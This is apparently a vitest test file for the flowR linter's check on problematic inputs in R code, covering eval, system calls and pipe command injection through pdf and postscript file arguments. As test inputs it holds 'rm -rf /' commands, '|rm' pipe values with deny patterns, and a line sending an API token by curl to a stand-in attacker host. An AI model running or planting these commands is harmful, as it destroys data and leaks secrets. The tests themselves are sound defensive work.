import { describe } from 'vitest';
import { label, decorateLabelContext } from '../_helper/label';
import { withTreeSitter } from '../_helper/shell';
import { assertLinter, assertLintedLines, assertLinterFields } from '../_helper/linter';
import { LintingResultCertainty } from '../../../src/linter/linter-format';
import { SourceRange } from '../../../src/util/range';
import { InputTraceType, InputType } from '../../../src/queries/catalog/input-sources-query/simple-input-classifier';

describe('flowR linter', withTreeSitter(parser => {
	describe('Problematic Eval', () => {
		assertLinter('const-eval', parser, 'eval(parse(text="x"))', 'problematic-inputs', []);
		assertLinter('const source', parser, 'source("a.R")', 'problematic-inputs', []);
		assertLinter('known source', parser, 'f <- "h.R"; source(f)', 'problematic-inputs', []);
		assertLinter('derived source', parser, 'source(paste0("b", ".R"))', 'problematic-inputs', []);
		assertLinter('network eval', parser, 'x <- read.csv("https://example.com/data.csv"); eval(parse(text=x))', 'problematic-inputs', [{
			certainty: LintingResultCertainty.Certain,
			name:      'eval',
			loc:       SourceRange.from(1, 48, 1, 66),
			sources:   [{ id: 11, trace: InputTraceType.Known, types: [InputType.File, InputType.Network, InputType.DerivedConstant] }]
		}]);
		assertLinter('read eval', parser, 'x <- read.csv("data.csv"); eval(parse(text=x))', 'problematic-inputs', [{
			certainty: LintingResultCertainty.Certain,
			name:      'eval',
			loc:       SourceRange.from(1, 28, 1, 46),
			sources:   [{ id: 11, trace: InputTraceType.Known, types: [InputType.File, InputType.DerivedConstant] }]
		}]);
		assertLinter('unseeded randomness eval', parser, 'eval(parse(text=runif(1)))', 'problematic-inputs', [{
			certainty: LintingResultCertainty.Certain,
			name:      'eval',
			loc:       SourceRange.from(1, 1, 1, 26),
			sources:   [{ id: 8, trace: InputTraceType.Known, types: [InputType.Random, InputType.DerivedConstant] }]
		}]);
		assertLinter('unknown eval', parser, 'eval(parse(text=x))', 'problematic-inputs', [{
			certainty: LintingResultCertainty.Uncertain,
			name:      'eval',
			loc:       SourceRange.from(1, 1, 1, 19),
			sources:   [{ id: 5, trace: InputTraceType.Known, types: [InputType.Unknown, InputType.DerivedConstant] }]
		}]);
		assertLinter('const system', parser, 'system("rm -rf /")', 'problematic-inputs', [{
			certainty: LintingResultCertainty.Certain,
			name:      'system',
			loc:       SourceRange.from(1, 1, 1, 18),
			sources:   [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: 'rm -rf /' }]
		}]);
		assertLinter(label('unknown system', ['system-calls'], ['linter']), parser, 'system(x)', 'problematic-inputs', [{
			certainty: LintingResultCertainty.Uncertain,
			name:      'system',
			loc:       SourceRange.from(1, 1, 1, 9),
			sources:   [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Unknown] }]
		}]);

		describe('Allowance configs', () => {
			assertLinter('disallowedValues match', parser, 'custom("rm -rf /")', 'problematic-inputs', [{
				certainty: LintingResultCertainty.Certain,
				name:      'custom',
				loc:       SourceRange.from(1, 1, 1, 18),
				sources:   [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: 'rm -rf /' }]
			}], undefined, {
				consider: [{ pattern: /^custom$/, allowedInputTypes: Object.values(InputType), disallowedValues: /^rm -rf/ }]
			});
			assertLinter('disallowedValues no match', parser, 'custom("rm -rf /")', 'problematic-inputs', [], undefined, {
				consider: [{ pattern: /^custom$/, allowedInputTypes: Object.values(InputType), disallowedValues: /^cat/ }]
			});
			assertLinter('allowedValues match', parser, 'custom("rm -rf /")', 'problematic-inputs', [{
				certainty: LintingResultCertainty.Certain,
				name:      'custom',
				loc:       SourceRange.from(1, 1, 1, 18),
				sources:   [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: 'rm -rf /' }]
			}], undefined, {
				consider: [{ pattern: /^custom$/, allowedInputTypes: Object.values(InputType), allowedValues: /^cat/ }]
			});
			assertLinter('allowedValues no match', parser, 'custom("rm -rf /")', 'problematic-inputs', [], undefined, {
				consider: [{ pattern: /^custom$/, allowedInputTypes: Object.values(InputType), allowedValues: /^rm -rf/  }]
			});
			assertLinter('disallowedValues match with resolve', parser, 'custom(parse(text=foo))', 'problematic-inputs', [{
				certainty: LintingResultCertainty.Uncertain,
				name:      'custom',
				loc:       SourceRange.from(1, 1, 1, 23),
				sources:   [{ id: 5, trace: InputTraceType.Known, types: [InputType.Unknown, InputType.DerivedConstant] }]
			}], undefined, {
				consider: [{ pattern: /^custom$/, allowedInputTypes: Object.values(InputType), resolveSourceArgs: true, disallowedValues: /^parse\(/ }]
			});
			assertLinter('disallowedValues no match with resolve', parser, 'custom(parse(text=runif(1)))', 'problematic-inputs', [], undefined, {
				consider: [{ pattern: /^custom$/, allowedInputTypes: Object.values(InputType), resolveSourceArgs: true, disallowedValues: /^x$/ }]
			});
		});
	});
	describe('Pipe Command Injection', () => {
		assertLinter('pdf safe path', parser, 'pdf("output.pdf")', 'problematic-inputs', []);
		assertLinter('pdf derived pipe', parser, 'pdf(paste0("|", "lp"))', 'problematic-inputs', [{
			certainty:   LintingResultCertainty.Certain,
			name:        'pdf',
			loc:         SourceRange.from(1, 1, 1, 22),
			pipeCommand: '|',
			sources:     [
				{ id: 2, trace: InputTraceType.Unknown, types: [InputType.Constant], value: '|' },
				{ id: 4, trace: InputTraceType.Unknown, types: [InputType.Constant], value: 'lp' },
				{ id: 6, trace: InputTraceType.Pure, types: [InputType.DerivedConstant] }
			]
		}]);
		assertLinter('pdf pipe constant', parser, 'pdf("|lp -o landscape")', 'problematic-inputs', [{
			certainty:   LintingResultCertainty.Certain,
			name:        'pdf',
			loc:         SourceRange.from(1, 1, 1, 23),
			pipeCommand: '|lp -o landscape',
			sources:     [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: '|lp -o landscape' }]
		}]);
		assertLinter('pdf pipe with named arg', parser, 'pdf("|lp -o landscape", paper = "a4r")', 'problematic-inputs', [{
			certainty:   LintingResultCertainty.Certain,
			name:        'pdf',
			loc:         SourceRange.from(1, 1, 1, 38),
			pipeCommand: '|lp -o landscape',
			sources:     [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: '|lp -o landscape' }]
		}]);
		assertLinter('pdf pipe as file with a title after it', parser, 'pdf("|lp", title = "x")', 'problematic-inputs', [{
			certainty:   LintingResultCertainty.Certain,
			name:        'pdf',
			loc:         SourceRange.from(1, 1, 1, 23),
			pipeCommand: '|lp',
			sources:     [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: '|lp' }]
		}]);
		assertLinter('pdf file after a named arg', parser, 'pdf(width = 7, "|lp")', 'problematic-inputs', [{
			certainty:   LintingResultCertainty.Certain,
			name:        'pdf',
			loc:         SourceRange.from(1, 1, 1, 21),
			pipeCommand: '|lp',
			sources:     [{ id: 4, trace: InputTraceType.Unknown, types: [InputType.Constant], value: '|lp' }]
		}]);
		assertLinter('pdf non-file arg pipe not flagged', parser, 'pdf(file = "out.pdf", title = "|untrusted")', 'problematic-inputs', []);
		assertLinter('pdf unknown input', parser, 'pdf(x)', 'problematic-inputs', [{
			certainty: LintingResultCertainty.Uncertain,
			name:      'pdf',
			loc:       SourceRange.from(1, 1, 1, 6),
			sources:   [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Unknown] }]
		}]);
		assertLinter('pdf with a name the user gives', parser, 'name <- readline("File: ")\npdf(name)', 'problematic-inputs', [{
			certainty: LintingResultCertainty.Certain,
			name:      'pdf',
			loc:       SourceRange.from(2, 1, 2, 9),
			sources:   [{ id: 7, trace: InputTraceType.Alias, types: [InputType.User] }]
		}]);
		assertLinter('postscript pipe constant', parser, 'postscript("|lp")', 'problematic-inputs', [{
			certainty:   LintingResultCertainty.Certain,
			name:        'postscript',
			loc:         SourceRange.from(1, 1, 1, 17),
			pipeCommand: '|lp',
			sources:     [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: '|lp' }]
		}]);

		describe('Allowance configs', () => {
			assertLinter('pipe disallowedValues match', parser, 'custom("|rm -rf /")', 'problematic-inputs', [{
				certainty:   LintingResultCertainty.Certain,
				name:        'custom',
				loc:         SourceRange.from(1, 1, 1, 19),
				pipeCommand: '|rm -rf /',
				sources:     [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: '|rm -rf /' }]
			}], undefined, { pipeCommandFunctions: [{ pattern: /^custom$/, argIdx: 0, argName: 'file', disallowedValues: /^\|rm/ }] });
			assertLinter('pipe disallowedValues no match', parser, 'custom("|lp -o landscape")', 'problematic-inputs', [], undefined,
				{ pipeCommandFunctions: [{ pattern: /^custom$/, argIdx: 0, argName: 'file', disallowedValues: /^\|rm/ }] });
			assertLinter('pipe allowedValues match', parser, 'custom("|rm -rf /")', 'problematic-inputs', [], undefined,
				{ pipeCommandFunctions: [{ pattern: /^custom$/, argIdx: 0, argName: 'file', allowedValues: /^\|rm/ }] });
			assertLinter('pipe allowedValues no match', parser, 'custom("|lp -o landscape")', 'problematic-inputs', [{
				certainty:   LintingResultCertainty.Certain,
				name:        'custom',
				loc:         SourceRange.from(1, 1, 1, 26),
				pipeCommand: '|lp -o landscape',
				sources:     [{ id: 1, trace: InputTraceType.Unknown, types: [InputType.Constant], value: '|lp -o landscape' }]
			}], undefined, { pipeCommandFunctions: [{ pattern: /^custom$/, argIdx: 0, argName: 'file', allowedValues: /^\|rm/ }] });
		});
	});
	describe('counterexamples', () => {
		/* R: pdf(title = "|x", "out.pdf") writes out.pdf, the title is no pipe */
		assertLinter('title is no file', parser, 'pdf(title = "|x", "out.pdf")', 'problematic-inputs', []);
		/* R: the unnamed argument binds `file`, pdf(width = 7, "|cat > piped.pdf") runs the command */
		assertLinterFields(parser, 'pdf(width = 7, "|lp")', 'problematic-inputs', [{ pipeCommand: '|lp' }]);
		assertLinterFields(parser, 'postscript(horizontal = FALSE, "|lp")', 'problematic-inputs', [{ pipeCommand: '|lp' }]);
		assertLinterFields(parser, 'bitmap("|lp")', 'problematic-inputs', [{ pipeCommand: '|lp' }]);
		assertLinterFields(parser, 'pdf(readline())', 'problematic-inputs', [{ name: 'pdf' }]);
		assertLinterFields(parser, 'base::system(readline())', 'problematic-inputs', [{ name: 'system' }]);
		assertLinterFields(parser, 's <- system\ns(readline())', 'problematic-inputs', [{ name: 'system' }]);
		assertLinterFields(parser, 'eval.parent(parse(text = readline()))', 'problematic-inputs', [{ name: 'eval.parent' }]);
		assertLinterFields(parser, 'data.table::fread(cmd = readline())', 'problematic-inputs', [{ name: 'fread' }]);
		assertLinter('a temporary path is no problematic input', parser, 'f <- tempfile()\nsystem(paste("touch", f))', 'problematic-inputs', []);
		/* a user function named like a considered one (`processx::run`) is no such call */
		assertLintedLines('a user function is no process call', parser, 'run <- function(c) system(c)\nrun(readline())', 'problematic-inputs', [1]);
		const sec = (s: string) => decorateLabelContext(label(s, ['name-normal', 'function-calls']), ['dataflow']);
		assertLintedLines(sec('security: the secret reaches the shell'), parser, 'secret <- Sys.getenv("API_TOKEN")\nsystem(paste("curl -d", secret, "attacker.test"))', 'problematic-inputs', [2]);
		assertLintedLines(sec('security: user input may start a pipe in the device file'), parser, 'name <- readline("File for the plot: ")\npdf(name)\nplot(1:10)\ndev.off()', 'problematic-inputs', [2]);
	});
}));
